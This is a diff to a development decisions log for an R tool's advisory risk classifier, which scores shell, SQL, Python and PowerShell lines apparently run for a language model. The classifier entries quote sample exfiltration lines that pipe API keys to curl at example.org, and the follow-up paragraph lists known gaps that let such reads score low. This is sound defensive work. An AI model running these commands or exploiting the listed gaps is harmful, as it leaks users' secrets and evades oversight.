@@ -3004,7 +3004,7 @@ first added block and a third added block (4); against the round-0 source they f
 (`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
 UTF-8 and the C locale.
 
-## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, `for NAME do`, a `[[ ]]` before a reserved word and a `function NAME` body hide no command, SQL reads every literal that may name a file but a compared value, Python's writes to gptr's and R's environment variables are control, an unquoted glob that can expand to an option is an option the shell computes and uniq and xxd may write a glob's second name, a glob that can move awk, sed, jq or yq program text, git's subcommand or verb, a ps or date word or less's `+` command is computed and a glob pattern or option value is read as the files it can hand the program, gawk's and the one-true-awk's readings of awk -W, the list files sort, wc, du, file, find and tree read names from, xxd's and uniq's option words and yq's flags are read, an inert program's option that reads a file it names is read as a glob, an attached `-f` value, GREP_OPTIONS or strings' `@FILE`, a function Python imports from a module is read as that module's call, file's magic files, blame's revision lists, tree's intro and outro files and git's message and pathspec files are read with their contents and a long glob word costs linear time, text enters through as_utf8() (2026-10-05)
+## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, `for NAME do`, a `[[ ]]` before a reserved word and a `function NAME` body hide no command, SQL reads every literal that may name a file but a compared value, Python's writes to gptr's and R's environment variables are control, an unquoted glob that can expand to an option is an option the shell computes and uniq and xxd may write a glob's second name, a glob that can move awk, sed, jq or yq program text, git's subcommand or verb, a ps or date word or less's `+` command is computed and a glob pattern or option value is read as the files it can hand the program, gawk's and the one-true-awk's readings of awk -W, the list files sort, wc, du, file, find and tree read names from, xxd's and uniq's option words and yq's flags are read, an inert program's option that reads a file it names is read as a glob, an attached `-f` value, GREP_OPTIONS or strings' `@FILE`, a function Python imports from a module is read as that module's call, file's magic files, blame's revision lists, tree's intro and outro files and git's message and pathspec files are read with their contents and a long glob word costs linear time, Python's open() modes in any letter order, a from-imported environ and PowerShell's env: drive are read, text enters through as_utf8() (2026-10-05)
 
 P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
 flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
@@ -3032,8 +3032,8 @@ readings of a parameter default (round 4), and every directory a `cd` can leave 
 added, item 12 what round 4 added, item 13 what round 5 added, item 14 what round 6 added,
 item 15 what round 7 (the classifier standard) added, item 16 what round 8 added, item 17
 what round 9 added, item 18 what round 10 added, item 19 what round 11 added, item 20 what
-round 12 added, item 21 what round 13 added, item 22 what round 14 added and item 23 what
-round 15 added.
+round 12 added, item 21 what round 13 added, item 22 what round 14 added, item 23 what
+round 15 added and item 24 what round 16 added.
 
 **The classifier standard (coordinator decision, review round 7; it wins over the wording above
 and over items 1-14 where they differ).** (A) Level 0 means *known* read-only, never "nothing
@@ -4092,17 +4092,17 @@ below 1, and SQL keeps its keyword reading (Known limits).
       `tree -H . --hintro=.Renviron` are 3 `secret` (were 0). A blame.ignoreRevsFile an
       environment variable names (`--config-env`) is 3 `dynamic`. Self-review: git's write
       subcommands read files the same way, and `risk_git_files_in()` now reads them: the
-      pathspec list of `--pathspec-from-file` (add, rm, checkout, reset, restore, commit, stash;
-      git prints `pathspec '<line>' did not match`), the message of `-F`/`--file` (commit, tag,
-      merge, notes; commit prints its first line) and commit's `-t`/`--template`; `-` is
-      standard input. `git commit -F .Renviron` and `git add --pathspec-from-file=.Renviron`
+      pathspec list of `--pathspec-from-file` (add, rm, checkout, restore, commit and stash push
+      print `pathspec '<line>' did not match`; reset reads it too), the message of `-F`/`--file`
+      (commit, tag, merge, notes; commit prints its first line) and commit's `-t`/`--template`;
+      `-` is standard input. `git commit -F .Renviron` and `git add --pathspec-from-file=.Renviron`
       were 2, now 3 `secret`.
     - *Long glob words (minor).* risk_glob_rx() scanned to the end of the pattern for each `[`
       without its `]`, and risk_glob_match() rebuilt the expression on every call, so an
       unquoted word of 1,000 `a*[` took 3.8 s and one of 2,000 11 s. The first `]` after each
       position is now found once (the same expression for 20,000 random patterns), and the
       expression is kept per pattern during a classification (`risk_memo("globrx", ...)`): a
-      word of 7,000 `a*[` (21 KB) takes under 0.5 s, and a test row bounds one of 3,000.
+      word of 7,000 `a*[` (21 KB) takes about 0.1 s, and a test row bounds one of 3,000.
     - *Changed rows:* none in older blocks. The 3,024 strings of the test file and of the
       round-5 to round-14 probe logs, each read as a command line and as Python, give the same
       level and top categories on the round-14 and round-15 sources but the 53 new rows, all
@@ -4113,9 +4113,57 @@ below 1, and SQL keeps its keyword reading (Known limits).
       (`from os import path; from x import remove`, 3 before, is 1: `x.remove` is no os
       function), and in a fuzz of 2,000 Python snippets three that the round-14 source read
       through its alias copy glued to an `import` at the code's end (none valid Python).
+24. **Review round 16 (findings against the standard; the final convergence round).** All three
+    findings were reproduced with a probe (`task2-fix16-probe-before.log`: every line the reviewer
+    lists has the level the reviewer gives), judged by (A)-(C) and accepted as majors under (iii):
+    a target literal text identifies was read below its class.
+    - *open()'s mode letters (major).* The file-write rule read an open() mode as a write only
+      when it started with `w`, `a` or `x`, or with `r+`; Python accepts the letters in any order,
+      so `open('.Rprofile', 'rb+')`, `open('.Rprofile', 'bw')`,
+      `open('.gptr/settings.json', mode='rt+')` and `pathlib.Path('.Rprofile').open('rb+')` were
+      1 (`r+b` was 4) and `open('b.txt', 'rb+')` was 1. A quoted mode made of the letters
+      `rwaxbtU+` that holds `w`, `a`, `x` or `+` is now a write
+      (`['"](?=[rwaxbtU+]*[wax+])[rwaxbtU+]+['"]`): the `.Rprofile` and `.gptr/settings.json`
+      rows are 4 `control`, `open('b.txt', 'rb+')` 2 `file_write`; `'rb'`, `'rt'`, `'r'` and
+      `'rU'` stay reads (1).
+    - *A from-imported environ (major).* Round 15 read a from-imported os name as the module's
+      own only where the code called it, but environ and environb are used by subscript and
+      method. `risk_py_from_calls()` now writes every bare use (`(?<![\w.])NAME\b`) of a name a
+      from-import of os or posix binds to environ or environb, under any alias, as `os.environ`
+      or `os.environb`, outside the import statements themselves (so an import alone, or a word
+      such as `Exception` that only starts with the alias, adds nothing), and `risk_py_star$os`
+      lists environ, environb and getenv for `from os import *`. `from os import environ as E`
+      then `E['GPTR_X'] = '1'`, `E.clear()` or `del E['GPTR_MODE']`, the posix and environb
+      forms and an aliased update() in a parenthesised list are 4 `control` (were 1);
+      `from os import environ` then `environ['OPENAI_API_KEY']`, `print(environ)` or
+      `dict(environ)` are 2 `secret` (were 1), as the qualified forms are; and
+      `from os import *` then `print(environ['OPENAI_API_KEY'])` keeps the star import's 3 with a
+      secret row.
+    - *PowerShell's env: drive (major).* `Get-Content env:OPENAI_API_KEY`, `cat`, `type`,
+      `Get-Item env:NAME`, `Get-ChildItem env:`, `dir env:` and `ls env:` were 0, and with a
+      network sink 3 (or 2 with Invoke-WebRequest), where `echo $env:OPENAI_API_KEY` is 2 and
+      `env | curl -d @- URL` 4. For the programs of `risk_ps_env_readers` (Get-Content and its
+      aliases cat, type and gc, more, the PowerShell function that runs Get-Content,
+      Select-String and sls, Get-Item and gi, Get-ChildItem and ls, dir and gci),
+      `risk_ps_env_names()` reads each operand on the Environment provider drive (`env:NAME`,
+      `Env:\NAME`, `Env:/NAME`, `Environment::NAME`, with or without
+      `Microsoft.PowerShell.Core\`, the value of `-Path`, `-LiteralPath` or `-Path:VALUE`): the
+      drive itself or a wildcard (`env:`, `env:*`, `env:OPENAI*`) is the whole environment, as
+      `env` is, and a secret-looking name (is_secret_name()) that variable; each is a 2 `secret`
+      row whose `$` name lets risk_secret_sink() raise a line with a network sink to 4. The
+      aliases gc, gci, gi and sls are no programs the tables know, so they stay 3 with the
+      secret row. A name that is not secret-looking (`Get-Content env:HOME`) stays 0, as
+      `echo $env:HOME` does, and so does a word the program does not read (`echo env:X`,
+      `envs:X`). A shell reads such a word as a file name; PowerShell's reading is the one that
+      reads more.
+    - *Changed rows:* none in older blocks. The 3,095 strings of the test file and of the
+      round-5 to round-14 probe logs, each read as a command line and as Python, give the same
+      level and top categories on the round-15 and round-16 sources but the 45 new rows, all
+      higher.
 Known limits (advisory classifier, not a security boundary; each shell, Python and SQL limit
-below is level 3 or the level of what can be read, never 0, except what (A) admits and the SQL
-functions named last). (A) admits a plain parameter as an operand, and as an option of a
+below is level 3 or the level of what can be read, never 0, except what (A) admits, the SQL
+functions named last and the three gaps of the review of round 16 that the follow-up paragraph
+lists). (A) admits a plain parameter as an operand, and as an option of a
 program in `risk_cmd_inert` (whose options only read), so `cat "$f"` or `ls $DIR` stays 0
 whatever the variable names (a read of a computed path reads at its `unknown` class, 0), and so
 do `wc -l "$f"` and `grep -n "$p" f.txt` when the variable holds an option that reads a file
@@ -4144,9 +4192,10 @@ other than echo, printf, a heredoc, find, fd, ls, dir, `git ls-files` or `rg --f
 reached through other indirections (an alias of `r`, a process call whose command is built at
 run time, a function bound by assignment, `cp = shutil.copy`, or imported from a module other than
 os, posix, shutil, subprocess, pty, asyncio, platform and signal; a name a from-import binds is
-read as the module's function wherever the code calls it, a string or comment included),
+read as the module's function wherever the code calls it, and one bound to environ or
+environb wherever the code uses it, a string or comment included),
 heredocs or here-strings read by a program other than a shell, an interpreter,
-`source`, xargs, sftp or ftp, and, the one limit that can be 0, a SELECT that calls a
+`source`, xargs, sftp or ftp, and, the one limit in this list that can be 0, a SELECT that calls a
 user-defined function, a stored procedure's side effects or a server function gptr does not
 list (item 14 lists the code, signal and state functions it reads; the statement shows nothing
 else): such a statement is read by its leading keyword, as G5 reads it. `set -e` and
@@ -4155,7 +4204,7 @@ never a lower one). A link made by `mklink` or `New-Item` is not followed on the
 guarded source is flagged). CDPATH set by a file the shell sources is read only through the
 unknown directory that `source` adds. A substitution in an unquoted
 heredoc that holds a comment is not read and is level 3 `dynamic`. Shell syntax is read as bash
-and dash read it (and PowerShell, for `#` comments); cmd.exe, gptr's last fallback on Windows
+and dash read it (and PowerShell, for `#` comments and the env: drive); cmd.exe, gptr's last fallback on Windows
 without Git Bash or PowerShell, has no `'` quotes, no `#` comments and `^` escapes, which the
 classifier does not model (a `cmd /c` line is read with sh's rules). An upper-case variable a
 line sets without export counts for its later programs (item 16), a lower-case one does not (a
@@ -4167,9 +4216,17 @@ in awk regular expressions, awk's `-W`) the reading that runs more commands is u
 `--cols` with a usage error; gptr reads the write).
 A SQL literal compared with a column is data (`WHERE p = '.env'` is 0), also when the query
 then reads that column's value as a path. Python's writes to the environment are read through
-the names `environ`, `environb`, putenv and unsetenv: through another name bound to
-os.environ (`e = os.environ; e['GPTR_X'] = '1'`) they are 2 (the os.environ read), and a
-computed key next to literal ones in update() is not flagged. A glob whose first character is a
+the names `environ`, `environb`, putenv and unsetenv, qualified or bound by a from-import of os
+or posix under any name (`from os import environ as E`, `from os import *`; round 16): through
+a name an assignment binds to os.environ (`e = os.environ; e['GPTR_X'] = '1'`, or `F = E` after
+the from-import) they are 2 (the os.environ read, never 1), and a computed key next to literal
+ones in update() is not flagged. PowerShell's environment is read through `$env:NAME` and the
+env: drive of the programs of `risk_ps_env_readers`; the braced `${env:NAME}` and .NET's
+`[Environment]::GetEnvironmentVariable()` are constructs gptr does not model (3, also with a
+network sink), and another cmdlet's env: operand (`Copy-Item env:X out.txt`, 2) is read by its
+table row only. PowerShell's comma arrays, a location on the env: drive, Python's getenv used as
+a value and the nt module's environ are not modelled and can read below the level of what is
+read (the follow-up paragraph lists them). A glob whose first character is a
 literal other than `-` stays an operand, although it may expand to several words
 (`git log R/*.R`); none of those words can be an option. Where a glob's position matters it is
 read as one that matches several names: after a glob pattern or option value every later word
@@ -4243,7 +4300,56 @@ added item 23 with one block (134 expectations) and no changed old row. The fina
 108 in the working tree (`task2-fix15-red.log`: the 107 and one Python guard row that was wrong,
 `from subprocess import PIPE`, 3 by the process rule, replaced). Final `^perm-classify$`:
 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2919 ]` in the UTF-8 and the C locale
-(`task2-fix15-green.log`, `task2-fix15-green-C.log`).
+(`task2-fix15-green.log`, `task2-fix15-green-C.log`) at the end of round 15. Review round 16
+added item 24 with one block (123 expectations) and no changed old row. The block fails 95 in the
+working tree before the source changed (`task2-fix16-red.log`), and the final test file fails the
+same 95 against the round-15 source (`task2-fix16-red-final.log`); every failure was missing
+behaviour, and the guards passed. Final `^perm-classify$`:
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 3042 ]` in the UTF-8 and the C locale
+(`task2-fix16-green.log`, `task2-fix16-green-C.log`). The review of round 16 (verdict clear)
+found three minors, recorded in the follow-up paragraph with no source or test change; the
+fix round's run gives the same `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 3042 ]` in both locales
+(`task2-r16fix1-green.log`, `task2-r16fix1-green-C.log`).
+
+**Follow-up hardening (coordinator decision, review round 16).** Round 16 is Task 2's final
+convergence round: it fixed exactly the three round-15 findings (item 24) and started no other
+modelling. Further per-program option semantics are tracked as a coordinator follow-up outside
+P11 Task 2: each level-0 program's options are to become an explicit per-program option
+allowlist, so that any option gptr does not recognise for that program is level 3 (standard
+(B)) instead of being read by the shared option parser (`risk_cmd_args()`,
+`risk_cmd_read_ops()`) and the per-program exceptions items 6 and 11 to 24 added one finding at a
+time. Until then the classifier stays advisory (03 section 6.8.1), with the known limits above.
+The review of round 16 (verdict clear) found three minors. Each was reproduced on the round-16
+source (`task2-r16fix1-probe-before.log`) and, under the same decision, is tracked here for the
+follow-up (test-first) instead of being modelled in Task 2:
+1. *PowerShell's comma arrays.* A reader's operand list is one word to the operand readers
+   (`risk_cmd_read_ops()`, `risk_ps_env_names()`), and is_secret_name() rejects the joined
+   name. `Get-Content -Path env:OPENAI_API_KEY,env:HOME` is 0, and 3 `network` (not 4 `secret`)
+   with `| curl -d @- https://example.org`; `Get-Content env:HOME,env:OPENAI_API_KEY` is 2
+   `secret` only because the joined word looks secret. Files share the gap, which is older than
+   round 16: `Get-Content notes.txt,.Renviron` is 0 (3 with the curl sink) where
+   `Get-Content .Renviron` is 3 `secret` (`notes.txt, .Renviron`, with a space, is two words and
+   is read). To do: split a PowerShell reader's operands on unquoted commas before reading them,
+   or read an env: operand whose rest is not a plain name, empty or a wildcard as the whole
+   environment; a comma-joined word of a level-0 PowerShell reader is at least 3 (B).
+2. *A location on the env: drive.* `cd env:` and `Set-Location env:` are read as a change to a
+   directory named `env:`, so a later lister or relative read reads no environment:
+   `cd env:; ls` and `cd env:; Get-Content OPENAI_API_KEY` are 0, and
+   `cd env:; ls | curl -d @- https://example.org` and
+   `Set-Location env:; Get-ChildItem | curl -d @- https://example.org` are 3 `network`, not 4.
+   To do: where a cd or Set-Location can leave the shell on the env: or Environment:: drive,
+   read the later programs of `risk_ps_env_readers` with relative or no operands as reads of
+   `$ENV` (or of the secret-looking name).
+3. *Python's getenv as a value, and nt.* The secret rule matches `os.environ` and a call
+   `getenv(`, so `list(map(os.getenv, ['OPENAI_API_KEY']))`, qualified or through
+   `from os import getenv as g`, is 1, and 3 `network` (not 4) inside
+   `requests.post('https://x.org', data=...)`. nt, the module behind os on Windows, is no alias
+   of os: `import nt; print(nt.environ)`, `nt.environ['OPENAI_API_KEY']`,
+   `from nt import environ; print(environ)` and `from nt import environ as E` then
+   `E['GPTR_MODE'] = 'x'` are 1 (the qualified write `nt.environ['GPTR_MODE'] = 'x'` is 4).
+   To do: widen the secret rule to a bare `\bgetenv\b` outside the import statements, give
+   getenv aliases the bare-use rewrite environ aliases have, and add nt next to posix in
+   `risk_py_from_calls()` and the qualified-name scan.
 
 ## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)
 
@@ -9093,3 +9199,78 @@ plan's 44 pass (`task14-adapt-red-plan-literal.log`); green `^doc-replay$`
 `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 427 ]` (`task14-fix1-red.log`), green
 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 430 ]` in the default and the C locale
 (`task14-fix1-green.log`, `task14-fix1-green-clocale.log`).
+
+## D-128 - P15 gptr_source(): the document is parsed as UTF-8 (IC-62), a file it cannot read is an invalid argument, a missing `replay` keeps the replay-mode chain, a stale call run without a write is `ran`, and expressions map to blocks by their parsed lines (2026-10-05)
+
+P15 Task 15 (`R/doc-replay.R`; tests appended to `test-doc-replay.R`). The export's signature,
+the srcref-based evaluation loop (its block mapping aside, item 6), the skip set and the
+`action` values are the plan's. The `gptr.replay` scope is the plan's when `replay` is given
+(item 4). The roxygen is the plan's plus one sentence each for items 4 and 5.
+
+1. **`parse(..., encoding = "UTF-8")` (IC-62).** `doc_read()` returns lines marked UTF-8. The
+   plan's `parse(text = doc$lines, keep.source = TRUE, srcfile = srcfile)` translates them to the
+   native encoding. In a non-UTF-8 locale every non-ASCII character of a string literal then
+   becomes `<U+00E9>` text: `x = "caf\u00e9"` bound `"caf<U+00E9>"`, and a call
+   `gptr("caf\u00e9 step")` received that text. Its prompt hash no longer matched its fresh block,
+   so the call was not located and ran live instead of replaying. IC-62 requires a UTF-8 prompt
+   literal of a script to stay byte-exact under `LC_ALL=C`. With `encoding = "UTF-8"` the parser
+   keeps the marked text and marks the literals UTF-8 (verified in a C and a UTF-8 locale; the
+   result in a UTF-8 locale is unchanged).
+2. **A file it cannot read is `invalid_argument`** (`arg = "file"`). A missing file or a
+   directory is checked first, as for `gptr_blocks()` (D-127 item 3). The plan let `doc_read()`
+   signal `gptr_error_doc_write` (reason `missing`), a write error that contract 6.4 does not
+   list for `gptr_source()`. Review round 2: the other `doc_read()` failures, a file that is not
+   valid UTF-8 (reason `encoding`, for example a Latin-1 or CP1252 script with an accented
+   literal) and an unreadable file (reason `unreadable`), are re-raised the same way with
+   `doc_read()`'s message (`expected = "a readable UTF-8 .R file"`). Nothing has been evaluated
+   and no frame is pushed at that point. `gptr_blocks()` still signals `doc_write` for these two
+   reasons and for a malformed notebook (Task 14 code, outside this task; left for the plan
+   acceptance).
+3. Test-only: the plan's two `expect_null(getOption("gptr.replay"))` assume that the option is
+   unset, but `tests/testthat/setup.R` (and `dev/ci/isolated-check.R`) set
+   `gptr.replay = "replay"` for the whole run. Both plan tests now begin with
+   `withr::local_options(gptr.replay = NULL)`, as the plan's own Task 17 test does, and keep the
+   literal `expect_null()`. This proves the restore on exit on the success path and after the
+   `stale_block` error: with the restore deleted, both lines fail
+   (`task15-fix1-mutation-no-restore.log`).
+4. **A missing `replay` is not scoped over the file (contract 7.8, IC-30).** The plan set
+   `options(gptr.replay = replay)` for every run. With the option unset, the default
+   `getOption("gptr.replay", "auto")` then installed `"auto"` above `GPTR_REPLAY` and the `replay`
+   setting in `replay_mode()`'s chain (`arg > gptr.replay > GPTR_REPLAY > settings > "auto"`).
+   Under `GPTR_REPLAY=replay`, which architecture section 1 and contract 7.8 promise proves that a
+   script makes no model call, `gptr_source(f)` regenerated a stale block live and rewrote it.
+   The signature is unchanged. Only a `replay` the caller gives is set and restored. Left
+   missing, it is still validated, and each call resolves its mode through `replay_mode()`.
+   While the option is set, this gives the same mode as before. P25's vignette calls
+   `gptr_source(script, envir = new.env())` without `replay` for its first, recording run, so a
+   precompute session under `GPTR_REPLAY=replay` must unset it or pass `replay = "auto"`.
+5. **A stale call that ran without a write reports `ran`.** Without write consent (`record`
+   `"off"`, or `"ask"` without a prompt), a stale block still regenerates in the route. The old
+   block is skipped and the call runs live, but nothing is written, so `doc_after_write()` logged
+   no action and the row read `NA`, which the roxygen keeps for blocks no call touched. A block
+   in the frame's skip set without a logged action is now `ran`. Its status stays `stale`, because
+   the document is unchanged. The same applies to a locked or conflicting document.
+6. **Expressions map to blocks by their parsed lines (review round 2).** The plan compared each
+   srcref's first and last line (fields 1 and 3) with the physical block lines of
+   `doc_find_blocks()`. Fields 1 and 3 follow `#line` directives, and R's parser reads any comment
+   that starts with `#line <digits>` as one (`#line 50 is where ...` included), so every later
+   line shifts. The locator (`doc_site_srcref()`) reads the parsed lines (fields 7 and 8) and
+   still found and regenerated the call, but the old block's expressions were no longer
+   recognised as its own: the old code ran, which `gptr_source()` exists to prevent, and the row
+   still read `regenerated`. The mapping now uses fields 7 and 8. The same field-1/3 reading
+   remains in `doc_stmt_by_expr()` (the `source()` frame locator) and `doc_drop_ranges()`
+   (recorded-code cleaning) in `doc-blocks.R` (Tasks 2 and 3, outside this task; left for the
+   plan acceptance).
+
+Validation: `progress/P15.md`, Task 15. Red `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 430 ]`
+(`task15-red.log`); against the plan literal the plan's tests fail only the 2 option
+expectations (`task15-green0-plan-literal.log`) and the addition blocks fail 5
+(`task15-adapt-red-plan-literal.log`); green `^doc-replay$`
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 466 ]` in the default and the C locale (`task15-green.log`,
+`task15-green-clocale.log`). Review round 1 (items 3-5): the 2 regression tests fail 8
+expectations on the previous source (`task15-fix1-red.log`); green
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 486 ]` in the default and the C locale
+(`task15-fix1-green.log`, `task15-fix1-green-clocale.log`). Review round 2 (items 2 and 6): the
+2 regression tests give `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 491 ]` on the previous source
+(`task15-fix2-red.log`); green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 500 ]` in the default and the
+C locale (`task15-fix2-green.log`, `task15-fix2-green-clocale.log`).
